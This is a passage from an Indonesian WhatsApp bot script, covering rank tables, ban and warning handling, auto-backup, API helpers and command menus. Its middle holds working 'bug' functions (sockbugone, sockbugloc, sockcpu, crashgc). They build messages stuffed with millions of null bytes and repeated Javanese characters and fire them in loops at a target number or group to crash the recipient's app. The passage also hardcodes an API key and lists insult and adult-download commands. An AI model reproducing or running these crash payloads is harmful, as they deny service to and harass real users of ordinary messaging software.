          maxLevel: 7200000
        },
        {
          name: 'Sorcerer',
          maxLevel: 7500000
        },
        {
          name: 'Necromancer',
          maxLevel: 7800000
        },
        {
          name: 'Assassin',
          maxLevel: 8100000
        },
        {
          name: 'Rogue',
          maxLevel: 8400000
        },
        {
          name: 'Ranger',
          maxLevel: 87000000
        },
        {
          name: 'Berserker',
          maxLevel: 90000000
        },
        {
          name: 'Monk',
          maxLevel: 93000000
        },
        {
          name: 'Priest',
          maxLevel: 96000000
        },
        {
          name: 'Druid',
          maxLevel: 99000000
        },
        {
          name: 'Shaman',
          maxLevel: 102000000
        },
        {
          name: 'Bard',
          maxLevel: 1050000000
        },
        {
          name: 'Alchemist',
          maxLevel: 1080000000
        },
        {
          name: 'Engineer',
          maxLevel: 1110000000
        },
        {
          name: 'Artificer',
          maxLevel: 1140000000
        },
        {
          name: 'Summoner',
          maxLevel: 1170000000
        },
        {
          name: 'Tamer',
          maxLevel: 1200000000
        },
        {
          name: 'Gladiator',
          maxLevel: 1230000000
        },
        {
          name: 'Titan',
          maxLevel: 12600000000
        },
        {
          name: 'Deity',
          maxLevel: 12900000000
        },
        {
          name: 'Celestial',
          maxLevel: 13200000000
        },
        {
          name: 'Eternal',
          maxLevel: 1350000000000
        },
        {
          name: 'Infinity',
          maxLevel: 1380000000000
        },
        {
          name: 'Ultimate',
          maxLevel: 1410000000000
        },
        {
          name: 'Omnipotent',
          maxLevel: 1440000000000
        },
        {
          name: 'Godlike',
          maxLevel: 1470000000000
        },
        {
          name: 'undefined',
          maxLevel: 999999999999999999
        }
      ];

      for (let i = 0; i < ranks.length; i++) {
        if (rrole <= ranks[i].maxLevel) {
          const rank = ranks[i].name;
          let rankid;
          if (rank === 'Max') {
            rankid = 0;
          } else {
            if (rrole < (ranks[i].maxLevel / 3)) {
              rankid = 1;
            } else if (rrole < (2 * ranks[i].maxLevel / 3)) {
              rankid = 2;
            } else {
              rankid = 3;
            }
          }
          return {
            rank,
            rankid
          };
        }
      }
      return {
        rank: 'Max',
        rankid: 0
      };
    }
    //
   
// blok user banned
if (isBannedUser(sender) && !isOwner) {
  return 
}

    //
    function loadBanned() {
  try {
    if (!fs.existsSync(bannedFile)) return []; // kalau file belum ada, kembalikan array kosong
    const data = fs.readFileSync(bannedFile, "utf8");
    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : []; // pastikan hasil array
  } catch (e) {
    console.error("❌ Gagal memuat banned list:", e);
    return [];
  }
}

function saveBanned(list) {
  try {
    fs.writeFileSync(bannedFile, JSON.stringify(list, null, 2));
    return true;
  } catch (e) {
    console.error('Error saveBanned:', e);
    return false;
  }
}

function isBannedUser(jid) {
  const list = loadBanned();
  return Array.isArray(list) && list.includes(jid);
}

function addBannedUser(jid) {
  const list = loadBanned();
  if (!list.includes(jid)) {
    list.push(jid);
    saveBanned(list);
    return true;
  }
  return false;
}

function removeBannedUser(jid) {
  let list = loadBanned();
  const before = list.length;
  list = list.filter(x => x !== jid);
  if (list.length !== before) {
    saveBanned(list);
    return true;
  }
  return false;
}
//
if (m.isGroup && db.chats[m.chat].mute) {
      if (!isOwner) return
    }
    //
// Lokasi penyimpanan data warning
const warnPath = path.join(__dirname, 'lib', 'database', 'warn.json')
if (!fs.existsSync(warnPath)) fs.writeFileSync(warnPath, JSON.stringify({}, null, 2))
const warnData = JSON.parse(fs.readFileSync(warnPath, 'utf-8'))

function saveWarnData() {
  fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2))
}

// Fungsi untuk menambah peringatan
async function addWarning(sock, m, reason, pushname) {
  const warnPath = path.join(__dirname, 'lib', 'database', 'warn.json')
  if (!fs.existsSync(warnPath)) fs.writeFileSync(warnPath, JSON.stringify({}))
  const warnData = JSON.parse(fs.readFileSync(warnPath))

  const sender = m.sender
  if (!warnData[sender]) warnData[sender] = { count: 0 }

  warnData[sender].count += 1
  fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2))

  await sock.sendMessage(m.chat, {
    text: `⚠️ *Peringatan ${warnData[sender].count}/3*\n\n@${sender.split("@")[0]} melanggar aturan: *${reason}*\n\nJika mencapai 3 peringatan, akan dikeluarkan.`,
    contextInfo: { mentionedJid: [sender] }
  }, { quoted: fakeQuoted })

  if (warnData[sender].count >= 3) {
    await sock.groupParticipantsUpdate(m.chat, [sender], 'remove')
    warnData[sender].count = 0
    fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2))
  }
}
//
async function groupSatus(jid, content) {
  const inside = await generateWAMessageContent(content, {
    upload: sock.waUploadToServer
  });
  const messageSecret = crypto.randomBytes(32);
  const m = generateWAMessageFromContent(jid, {
    messageContextInfo: {
      messageSecret 
    },
    groupStatusMessageV2: {
      message: {
        ...inside,
        messageContextInfo: {
          messageSecret
        }
      }
    }
  }, {});
  await sock.relayMessage(jid, m.message, {
    messageId: m.key.id
  });
  return m;
}
async function autoBackupScript(sock) {
    try {
        const fs = require("fs");
        const { execSync } = require("child_process");

        const tmpDir = "./library/database/Sampah";
        if (fs.existsSync(tmpDir)) {
            const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
            for (let file of files) {
                fs.unlinkSync(`${tmpDir}/${file}`);
            }
        }

        const name = `${namaBot.replace(/\s+/g, "_")}_Version${version.replace(/\s+/g, "_")}`;
        const exclude = ["node_modules", "Session", "package-lock.json", "yarn.lock", ".npm", ".cache"];
        const filesToZip = fs.readdirSync(".").filter(f => !exclude.includes(f) && f !== "");

        if (!filesToZip.length) {
            console.log("[AUTO-BACKUP] Tidak ada file untuk di-backup.");
            return;
        }

        execSync(`zip -r ${name}.zip ${filesToZip.join(" ")}`);

        if (!fs.existsSync(`./${name}.zip`)) {
            console.log("[AUTO-BACKUP] Gagal membuat ZIP!");
            return;
        }

        await sock.sendMessage(global.owner + "@s.whatsapp.net", {
            document: fs.readFileSync(`./${name}.zip`),
            fileName: `${name}.zip`,
            mimetype: "application/zip"
        });

        fs.unlinkSync(`./${name}.zip`);
        console.log(`[AUTO-BACKUP] Backup ${name}.zip berhasil dikirim.`);
    } catch (err) {
        console.error("[AUTO-BACKUP ERROR]:", err);
    }
}

// === INTERVAL AUTO BACKUP ===
setInterval(() => {
    if (global.autoBackup) {
        autoBackupScript(sock);
    }
}, 60 * 60 * 1000);
//
/**
 * convertEsmToCjs - converter sederhana berbasis regex
 * Notasi: menangani import/export umum (default, named, namespace, side-effect),
 *         export declarations, export list, export * from ...
 * Limitasi: tidak 100% untuk dynamic import, re-export kompleks atau terselubung dalam template strings.
 */
function convertEsmToCjs(code) {
  let out = code;

  // 1) import ... from 'x'
  // default: import foo from 'mod'  -> const foo = require('mod');
  out = out.replace(
    /import\s+([A-Za-z0-9_$]+)\s+from\s+(['"`][^'"`]+['"`]);?/g,
    (m, def, mod) => `const ${def} = require(${mod});`
  );

  // 2) import { a, b as c } from 'mod'
  out = out.replace(
    /import\s+\{\s*([^}]+)\s*\}\s+from\s+(['"`][^'"`]+['"`]);?/g,
    (m, list, mod) => {
      // convert "b as c" -> "b: c"
      const mapped = list
        .split(',')
        .map(s => s.trim().replace(/\s+as\s+/i, ': '))
        .join(', ');
      return `const { ${mapped} } = require(${mod});`;
    }
  );

  // 3) import * as ns from 'mod'
  out = out.replace(
    /import\s+\*\s+as\s+([A-Za-z0-9_$]+)\s+from\s+(['"`][^'"`]+['"`]);?/g,
    (m, name, mod) => `const ${name} = require(${mod});`
  );

  // 4) import 'side-effect';
  out = out.replace(/import\s+(['"`][^'"`]+['"`]);?/g, (m, mod) => `require(${mod});`);

  // 5) export default <expr|function|class>
  // handle "export default function name(...) { ... }" and "export default class Name {...}"
  out = out.replace(/export\s+default\s+function\s+([A-Za-z0-9_$]*)/g, (m, name) => {
    if (name) return `function ${name}`;
    return 'module.exports = function';
  });
  out = out.replace(/export\s+default\s+class\s+([A-Za-z0-9_$]*)/g, (m, name) => {
    if (name) return `class ${name}`;
    return 'module.exports = class';
  });
  // generic default export (expression)
  out = out.replace(/export\s+default\s+/g, 'module.exports = ');

  // 6) export const/let/var name = ...
  // Keep declaration, and append exports.name = name;
  out = out.replace(/export\s+(const|let|var)\s+([A-Za-z0-9_$]+)\s*=/g, (m, kind, name) => {
    return `${kind} ${name} =`;
  });
  // After declarations, add mapping for exported vars (simple heuristic)
  // Find exported var/let/const names and append export lines at end of file if not already exported
  const exportVars = [];
  const varRegex = /(?:^|\n)\s*(?:const|let|var)\s+([A-Za-z0-9_$]+)\s*=/g;
  let match;
  // Collect variable names that were originally exported by looking for preceding "export " in original code
  const originalExportVarRegex = /export\s+(?:const|let|var)\s+([A-Za-z0-9_$]+)\s*=/g;
  while ((match = originalExportVarRegex.exec(code))) {
    exportVars.push(match[1]);
  }

  if (exportVars.length) {
    const exportLines = exportVars.map(n => `exports.${n} = ${n};`).join('\n');
    out += '\n\n' + exportLines + '\n';
  }

  // 7) export { a, b as c }
  out = out.replace(/export\s*\{\s*([^}]+)\s*\}\s*;?/g, (m, list) => {
    return list
      .split(',')
      .map(item => {
        const part = item.trim();
        const asMatch = part.match(/^([A-Za-z0-9_$]+)\s+as\s+([A-Za-z0-9_$]+)$/i);
        if (asMatch) return `exports.${asMatch[2]} = ${asMatch[1]};`;
        return `exports.${part} = ${part};`;
      })
      .join('\n');
  });

  // 8) export * from 'module'
  out = out.replace(/export\s+\*\s+from\s+(['"`][^'"`]+['"`]);?/g, (m, mod) => {
    return `Object.assign(exports, require(${mod}));`;
  });

  // 9) export function / class declarations: export function foo() {} -> function foo() {} ; exports.foo = foo;
  out = out.replace(/export\s+function\s+([A-Za-z0-9_$]+)\s*\(/g, (m, name) => {
    return `function ${name}(`;
  });
  // collect those and append exports for them
  const exportedFuncs = [];
  const funcRegex = /export\s+function\s+([A-Za-z0-9_$]+)\s*\(/g;
  while ((match = funcRegex.exec(code))) exportedFuncs.push(match[1]);
  if (exportedFuncs.length) {
    out += '\n\n' + exportedFuncs.map(n => `exports.${n} = ${n};`).join('\n') + '\n';
  }

  // 10) clean up multiple blank lines
  out = out.replace(/\n{3,}/g, '\n\n');

  return out;
}

async function convertWithBabel(sourceCode) {
  const result = await babel.transformAsync(sourceCode, {
    plugins: ['@babel/plugin-transform-modules-commonjs'],
    sourceType: 'module',
    configFile: false,
    babelrc: false,
  });
  return result.code;
}
const api = {
  xterm: {
    url: "https://api.termai.cc",
    key: "TermAI-4ALwMabCh0KiN9I3"
  }
};
//
const reqFile = './lib/database/req.json';

// Load DB
function loadReq() {
    try {
        if (!fs.existsSync(reqFile)) {
            saveReq([]);
            return [];
        }

        let data = JSON.parse(fs.readFileSync(reqFile));

        if (!Array.isArray(data)) {
            saveReq([]);
            return [];
        }

        return data;
    } catch {
        saveReq([]);
        return [];
    }
}

// Save DB
function saveReq(db) {
    fs.writeFileSync(reqFile, JSON.stringify(db, null, 2));
}
async function ptlaRequest(path, method = "GET") {
    const res = await fetch(global.domain + path, {
        method,
        headers: {
            "Authorization": `Bearer ${global.apikey}`,
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
    });

    return res.json().catch(() => ({ error: true }));
}
async function ptlaRequestV2(path, method = "GET") {
    const res = await fetch(global.domainV2 + path, {
        method,
        headers: {
            "Authorization": `Bearer ${global.apikeyV2}`,
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
    });

    return res.json().catch(() => ({ error: true }));
}
//
async function sockbugone(chat) {
          var msg = generateWAMessageFromContent(chat, proto.Message.fromObject({
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    'title': '',
                    'subtitle': " "
                  },
                  'body': {
                    'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
                  },
                  'footer': {
                    'text': 'xp'
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': 'cta_url',
                      'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
                    }],
                    'messageParamsJson': "\0".repeat(1000000)
                  }
                }
              }
            }
          }), {
            'userJid': chat
          });
          await sock.relayMessage(chat, msg.message, {
            'participant': {
              'jid': chat
            },
            'messageId': msg.key.id
          });
        }

        async function sockbugloc(chat) {
          var msg = generateWAMessageFromContent(chat, proto.Message.fromObject({
            'viewOnceMessage': {
              'message': {
                'liveLocationMessage': {
                  'degreesLatitude': 'p',
                  'degreesLongitude': 'p',
                  "caption": '\0ꦾꦾ'.repeat(10000) + "ꦾ".repeat(60000),
                  'sequenceNumber': '0',
                  'jpegThumbnail': ''
                }
              }
            }
          }), {
            'userJid': chat
          });
          await sock.relayMessage(chat, msg.message, {
            'participant': {
              'jid': chat
            },
            'messageId': msg.key.id
          });
        }

        const VxO = "🔥⭑𝐕𝐱͢𝐎⭑͜͡🔥" + "\u0000ꦾ".repeat(50000)
        async function sockcpu(chat) {
          var messageContent = generateWAMessageFromContent(chat, proto.Message.fromObject({
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    "hasMediaAttachment": true,
                    'sequenceNumber': '0',
                    "jpegThumbnail": ""
                  },
                  'nativeFlowMessage': {
                    "buttons": [{
                      "name": "review_and_pay",
                      "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${VxO},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
                    }],
                    "messageParamsJson": '\0'.repeat(10000),
                  }
                }
              }
            }
          }), {});
          sock.relayMessage(chat, messageContent.message, {
            'messageId': messageContent.key.id
          });
        }

        async function crashgc(chat) {
          let msg = generateWAMessageFromContent(chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                    text: `Jawab Donggg`
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: name
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                    title: "L7z",
                    subtitle: "L7z Team",
                    hasMediaAttachment: false
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "review_and_pay",
                      "buttonParamsJson": `{\n  currency: 'IDR',\n  payment_configuration: '',\n  payment_type: '',\n  transaction_id: '',\n  total_amount: { value: 3000000, offset: 100 },\n  reference_id: '4N88TZPXWUM',\n  type: 'physical-goods',\n  payment_method: '',\n  order: {\n    status: 'pending',\n    description: '',\n    subtotal: { value: 3500000, offset: 100 },\n    tax: { value: 500000, offset: 100 },\n    discount: { value: 1100000, offset: 100 },\n    shipping: { value: 100000, offset: 100 },\n    order_type: 'ORDER',\n    items: [\n  {\n    retailer_id: 'custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0',\n    name: 'SEGERA OUT❗️❗️',\n    amount: { value: 3000, offset: 100 },\n    quantity: ${totalfitur}\n  }\n]\n  },\n  additional_note: ''\n}`
                    }],
                  })
                })
              }
            }
          }, {
            quoted: m
          })

          await sock.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
          })
        }

        async function sockbug(nombor, jumlahnyo) {
          for (let i = 0; i < jumlahnyo; i++) {
            sockcpu(nombor)
            sockbugloc(nombor)
            await delay(1000)
          }
        }

        async function gcbug(nombor, jumlahnyo) {
          for (let i = 0; i < jumlahnyo; i++) {
            crashgc(nombor)
            await delay(1000)
          }
        }
        async function lagu() {
  const { spawn } = require('child_process');
  
  // Audio source URL
  const audioUrl = audio;
  
  // Buat proses ffmpeg
  const ffmpegProcess = spawn('ffmpeg', [
    '-i', audioUrl,
    '-vn',
    '-b:a', '64k',
    '-ac', '1',
    '-ar', '48000',
    '-application', 'voip',
    '-compression_level', '5',
    '-map_metadata', '0',
    '-c:a', 'libopus',
    '-f', 'ogg',
    'pipe:1' // Output ke stdout
  ]);

  // Kumpulkan data stream
  const chunks = [];
  ffmpegProcess.stdout.on('data', (chunk) => chunks.push(chunk));
  
  await new Promise((resolve, reject) => {
    ffmpegProcess.on('close', (code) => {
      if (code !== 0) {
        reject(new Error(`FFmpeg exited with code ${code}`));
        return;
      }
      resolve();
    });
    
    ffmpegProcess.stderr.on('data', (data) => {
      console.error(`FFmpeg: ${data}`);
    });
  });

  // Gabungkan semua chunk menjadi buffer
  const audioBuffer = Buffer.concat(chunks);

  // Kirim ke WhatsApp
  await sock.sendMessage(m.chat, {
    audio: audioBuffer,
    mimetype: 'audio/ogg; codecs=opus',
    ptt: true
  });
}
        
// =======================
// 🔥 ANTI SPAM
// =======================
if (db.chats[m.chat].antispam) {

    let user = global.db.users[m.sender];

    // Cek apakah user sudah banned
    if (user.banned) return;

    // Jika user spam (spam = pesan sama dikirim berulang cepat)
    if (!user.lastMsg) user.lastMsg = "";
    if (!user.lastTime) user.lastTime = 0;

    let now = Date.now();
    let fast = now - user.lastTime < 1500; // < 1.5 detik dianggap spam
    let same = m.text === user.lastMsg;

    if (fast && same) {
        user.spam++;

        if (user.spam >= 3) {
            user.banned = true;

            // Kick dari grup
            if (isGroup) {
                await sock.groupParticipantsUpdate(m.chat, [m.sender], "remove");
            }

            return m.reply(`🚫 *Kamu telah dibanned karena spam lebih dari 3x!*`);
        } else {
            m.reply(`⚠️ Warning spam! (${user.spam}/3)`);
        }
    }

    // Update data terakhir
    user.lastMsg = m.text;
    user.lastTime = now;
}
//
sock.autoReactionSW = sock.autoReactionSW || true
if (sock.autoReactionSW) {
sock.storyJid = sock.storyJid ? sock.storyJid : []
if (
m.chat.endsWith('broadcast') &&
!sock.storyJid.includes(m.sender) &&
m.sender != sock.decodeJid(sock.user.id)
) {
sock.storyJid.push(m.sender)
}
if (
m.chat.endsWith('broadcast') &&
[...new Set(sock.storyJid)].includes(m.sender) &&
!/protocol/.test(m.mtype)
) {
await sock.sendMessage(
'status@broadcast',
{
react: {
text: Func.random(['🤣', '🥹', '😂', '😋', '😎', '🤓', '🤪', '🥳', '😠', '😱', '🤔', '🥶']),
key: m.key
}
},
{
statusJidList: [m.sender]
}
)
}
}
async function ezremove(path) {
  const form = new FormData()
  form.append('image_file', fs.createReadStream(path), path.split('/').pop())

  const create = await axios.post(
    'https://api.ezremove.ai/api/ez-remove/watermark-remove/create-job',
    form,
    {
      headers: {
        ...form.getHeaders(),
        'User-Agent': 'Mozilla/5.0',
        origin: 'https://ezremove.ai',
        'product-serial': 'sr-' + Date.now()
      }
    }
  ).then(v => v.data).catch(() => null)

  if (!create || !create.result || !create.result.job_id) {
    return { status: 'error' }
  }

  const job = create.result.job_id

  for (let i = 0; i < 10; i++) {
    await new Promise(r => setTimeout(r, 2000))

    const check = await axios.get(
      `https://api.ezremove.ai/api/ez-remove/watermark-remove/get-job/${job}`,
      {
        headers: {
          'User-Agent': 'Mozilla/5.0',
          origin: 'https://ezremove.ai',
          'product-serial': 'sr-' + Date.now()
        }
      }
    ).then(v => v.data).catch(() => null)

    if (check && check.code === 100000 && check.result && check.result.output) {
      return { job, result: check.result.output[0] }
    }

    if (!check || !check.code || check.code !== 300001) break
  }

  return { status: 'processing', job }
}
// OWNER
const menuowner = `
╔── ✇➣ MENU - OWNER
┃ 𓋜 .joingc
┃ 𓋜 .addowner
┃ 𓋜 .delowner
┃ 𓋜 .listowner
┃ 𓋜 .addprem
┃ 𓋜 .delprem
┃ 𓋜 .listprem
┃ 𓋜 .setbotpp
┃ 𓋜 .setbotname
┃ 𓋜 .setbotbio
┃ 𓋜 .autoread
┃ 𓋜 .autotyping
┃ 𓋜 .autobio
┃ 𓋜 .onlygc
┃ 𓋜 .onlypc
┃ 𓋜 .onlyadmin
┃ 𓋜 .addcase
┃ 𓋜 .delcase
┃ 𓋜 .listcase
┃ 𓋜 .getcase
┃ 𓋜 .self/public
┃ 𓋜 .creategc
┃ 𓋜 .backupsc
┃ 𓋜 .sendchat
┃ 𓋜 .rvo
┃ 𓋜 .addlimit
┃ 𓋜 .addsewa
┃ 𓋜 .listsewa
┃ 𓋜 .setmenu
┃ 𓋜 .ban
┃ 𓋜 .unban
┃ 𓋜 .setautobeckup
┃ 𓋜 .playch
┃ 𓋜 .listdbuser
╚━━━━━━━━━━━ ✇➣
`
const menugroup = `
╔── ✇➣ MENU - GROUP
┃ 𓋜 .open/close
┃ 𓋜 .promote/demote
┃ 𓋜 .antilinkall
┃ 𓋜 .antilinkgc
┃ 𓋜 .antilinkch
┃ 𓋜 .antilinkig
┃ 𓋜 .antiwame
┃ 𓋜 .antijudol
┃ 𓋜 .kick
┃ 𓋜 .linkgc
┃ 𓋜 .resetlinkgc
┃ 𓋜 .totag
┃ 𓋜 .hidetag
┃ 𓋜 .tagall
┃ 𓋜 .setppgc
┃ 𓋜 .delppgc
┃ 𓋜 .addbadwords
┃ 𓋜 .delbadwords
┃ 𓋜 .list
┃ 𓋜 .addlist
┃ 𓋜 .dellist
┃ 𓋜 .updatelist
┃ 𓋜 .welcome
┃ 𓋜 .goodbye
┃ 𓋜 .setwelcome
┃ 𓋜 .setgoodbye
┃ 𓋜 .setwelcomeimage
┃ 𓋜 .setgoodbyeimage
┃ 𓋜 .welcomestatus
┃ 𓋜 .antitagsw
┃ 𓋜 .antivideo
┃ 𓋜 .absen
┃ 𓋜 .listabsen
┃ 𓋜 .accall
┃ 𓋜 .rejectall
┃ 𓋜 .add
┃ 𓋜 .antifoto
┃ 𓋜 .mutegc
┃ 𓋜 .setnamegc
┃ 𓋜 .setdescgc
┃ 𓋜 .toswgc
┃ 𓋜 .antispam
╚━━━━━━━━━━━ ✇➣
`

const menuother = `
╔── ✇➣ MENU - OTHER
┃ 𓋜 .bfstock
┃ 𓋜 .sound1 - sound250
┃ 𓋜 .sad1 - sad55
┃ 𓋜 .music1 - music65
┃ 𓋜 .mangkane1 - mangkane54
┃ 𓋜 .removebg
┃ 𓋜 .pastebin
┃ 𓋜 .getpp
┃ 𓋜 .iqc
┃ 𓋜 .brat
┃ 𓋜 .bratvid
┃ 𓋜 .remini
┃ 𓋜 .smeme
┃ 𓋜 .toimage
┃ 𓋜 .tovn
┃ 𓋜 .toaudio
┃ 𓋜 .tourl
┃ 𓋜 .tourl2
┃ 𓋜 .tourlgh
┃ 𓋜 .stiker
┃ 𓋜 .cek
┃ 𓋜 .ping
┃ 𓋜 .owner
┃ 𓋜 .afk
┃ 𓋜 .getpb
┃ 𓋜 .owner
┃ 𓋜 .qc
┃ 𓋜 .vn
┃ 𓋜 .hdvid
┃ 𓋜 .limit
┃ 𓋜 .claim
┃ 𓋜 .daily
┃ 𓋜 .tomedia
┃ 𓋜 .toprompt
┃ 𓋜 .register
┃ 𓋜 .unregister
┃ 𓋜 .gaginfo
┃ 𓋜 .lyrics
┃ 𓋜 .pendek
┃ 𓋜 .esm2cjs
┃ 𓋜 .readmore
┃ 𓋜 .cekidch
┃ 𓋜 .luma
┃ 𓋜 .elevenlabs
┃ 𓋜 .react
┃ 𓋜 .removewm 
┃ 𓋜 .ssweb
┃ 𓋜 .tgsticker
┃ 𓋜 .get
┃ 𓋜 .cuaca
┃ 𓋜 .buysc
╚━━━━━━━━━━━ ✇➣
`
const menuai = `
╔── ✇➣ MENU - AI
┃ 𓋜 .lyrra
┃ 𓋜 .lyrraai
┃ 𓋜 .autoai
┃ 𓋜 .ai
┃ 𓋜 .gpt
┃ 𓋜 .openai
┃ 𓋜 .ocr
┃ 𓋜 .copilot
┃ 𓋜 .felo
┃ 𓋜 .islamai
┃ 𓋜 .aiimage
┃ 𓋜 .aivideo
┃ 𓋜 .perplexity
┃ 𓋜 .copilot-think 
┃ 𓋜 .txt2music
┃ 𓋜 .veo3
┃ 𓋜 .shion
╚━━━━━━━━━━━ ✇➣
`

const menudownload = `
╔── ✇➣ MENU - DOWNLOAD
┃ 𓋜 .SnackVideo
┃ 𓋜 .tiktok
┃ 𓋜 .ytmp4
┃ 𓋜 .ytmp3
┃ 𓋜 .tiktoksearch
┃ 𓋜 .ytsearch
┃ 𓋜 .tiktokaudio
┃ 𓋜 .douyin
┃ 𓋜 .capcut
┃ 𓋜 .threads
┃ 𓋜 .instagram
┃ 𓋜 .facebook
┃ 𓋜 .kuaishou
┃ 𓋜 .qq
┃ 𓋜 .espn
┃ 𓋜 .pinterest
┃ 𓋜 .imdb
┃ 𓋜 .imgur
┃ 𓋜 .ifunny
┃ 𓋜 .izlesene
┃ 𓋜 .reddit
┃ 𓋜 .youtube
┃ 𓋜 .twitter
┃ 𓋜 .vimeo
┃ 𓋜 .snapchat
┃ 𓋜 .bilibili
┃ 𓋜 .dailymotion
┃ 𓋜 .sharechat
┃ 𓋜 .likee
┃ 𓋜 .linkedin
┃ 𓋜 .tumblr
┃ 𓋜 .hipi
┃ 𓋜 .telegram
┃ 𓋜 .getstickerpack
┃ 𓋜 .bitchute
┃ 𓋜 .febspot
┃ 𓋜 .9gag
┃ 𓋜 .oke.ru
┃ 𓋜 .rumble
┃ 𓋜 .streamable
┃ 𓋜 .ted
┃ 𓋜 .sohutv
┃ 𓋜 .pornbox
┃ 𓋜 .xvideos
┃ 𓋜 .xnxx
┃ 𓋜 .kuaishou
┃ 𓋜 .xiaohongshu
┃ 𓋜 .ixigua
┃ 𓋜 .weibo
┃ 𓋜 .miaopai
┃ 𓋜 .meipai
┃ 𓋜 .xiaoying
┃ 𓋜 .national video
┃ 𓋜 .yingke
┃ 𓋜 .sina
┃ 𓋜 .bluesky
┃ 𓋜 .soundcloud
┃ 𓋜 .mixcloud
┃ 𓋜 .spotify
┃ 𓋜 .zingmp3
┃ 𓋜 .bandcamp
┃ 𓋜 .download
┃ 𓋜 .mediafire
┃ 𓋜 .gdrive
┃ 𓋜 .pinalbum
┃ 𓋜 .autodownload 
┃ 𓋜 .gitclone
╚━━━━━━━━━━━ ✇➣
`

const menuconvert = `
╔── ✇➣ MENU - CONVERT
┃ 𓋜 .bass
┃ 𓋜 .blown
┃ 𓋜 .deep
┃ 𓋜 .earrrape
┃ 𓋜 .fast
┃ 𓋜 .fat
┃ 𓋜 .nightcore
┃ 𓋜 .reverse
┃ 𓋜 .robot
┃ 𓋜 .slow
┃ 𓋜 .smooth
┃ 𓋜 .tupai
╚━━━━━━━━━━━ ✇➣
`
const menucpanel = `
╔── ✇➣ MENU - CPANEL
┃ 𓋜 .1gb
┃ 𓋜 .2gb
┃ 𓋜 .3gb
┃ 𓋜 .4gb
┃ 𓋜 .5gb
┃ 𓋜 .6gb
┃ 𓋜 .7gb
┃ 𓋜 .8gb
┃ 𓋜 .9gb
┃ 𓋜 .10gb
┃ 𓋜 .unli
┃ 𓋜 .cadmin
┃ 𓋜 .deladmin
┃ 𓋜 .listadmin
┃ 𓋜 .delpanel
┃ 𓋜 .listpanel
┃ 𓋜 .clearuser
┃ 𓋜 .clearserver
┃ 𓋜 .clearadmin 
╚━━━━━━━━━━━ ✇➣
`

const menucpanel2 = `
╔── ✇➣ MENU - CPANELV2
┃ 𓋜 .1gb-V2
┃ 𓋜 .2gb-V2
┃ 𓋜 .3gb-V2
┃ 𓋜 .4gb-V2
┃ 𓋜 .5gb-V2
┃ 𓋜 .6gb-V2
┃ 𓋜 .7gb-V2
┃ 𓋜 .8gb-V2
┃ 𓋜 .9gb-V2
┃ 𓋜 .10gb-V2
┃ 𓋜 .unli-V2
┃ 𓋜 .cadmin-V2
┃ 𓋜 .deladmin-V2
┃ 𓋜 .listadmin-V2
┃ 𓋜 .delpanel-V2
┃ 𓋜 .listpanel-V2
┃ 𓋜 .clearuser-V2
┃ 𓋜 .clearserver-V2
┃ 𓋜 .clearadmin-V2
╚━━━━━━━━━━━ ✇➣
`

const menufun = `
╔── ✇➣ MENU - FUN
┃ 𓋜 .apakah
┃ 𓋜 .bisakah
┃ 𓋜 .kapankah
┃ 𓋜 .bagaimanakah
┃ 𓋜 .cekganteng
┃ 𓋜 .cekcantik
┃ 𓋜 .cekgay
┃ 𓋜 .ceklesbi
┃ 𓋜 .ceksifat
┃ 𓋜 .cekhoby
┃ 𓋜 .cekjodoh
┃ 𓋜 .cekkhodam
┃ 𓋜 .jadian
┃ 𓋜 .terima
┃ 𓋜 .tolak
┃ 𓋜 .putus
┃ 𓋜 .cekpasangan
┃ 𓋜 .wangy
┃ 𓋜 .rate
┃ 𓋜 .top
┃ 𓋜 .bego
┃ 𓋜 .goblok
┃ 𓋜 .janda
┃ 𓋜 .perawan
┃ 𓋜 .babi
┃ 𓋜 .tolol
┃ 𓋜 .pekok
┃ 𓋜 .jancok
┃ 𓋜 .pinter
┃ 𓋜 .pintar
┃ 𓋜 .asu
┃ 𓋜 .bodoh
┃ 𓋜 .gay
┃ 𓋜 .lesby
┃ 𓋜 .bajingan
┃ 𓋜 .jancok
┃ 𓋜 .anjing
┃ 𓋜 .anjg
┃ 𓋜 .anjj
┃ 𓋜 .anj
┃ 𓋜 .ngentod
┃ 𓋜 .ngentot
┃ 𓋜 .monyet
┃ 𓋜 .mastah
┃ 𓋜 .newbie
┃ 𓋜 .bangsat
